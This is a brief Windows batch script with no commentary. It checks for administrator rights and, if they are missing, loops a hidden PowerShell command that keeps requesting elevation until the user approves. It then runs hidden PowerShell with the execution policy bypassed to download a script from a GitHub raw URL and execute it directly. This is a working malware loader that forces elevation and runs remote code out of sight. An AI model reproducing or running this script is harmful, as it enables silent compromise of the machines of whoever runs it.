@echo off
cd /d "%~dp0"
net session >nul 2>&1
if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
powershell -w hidden -nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/43a1723/test/main/download.ps1 | iex"
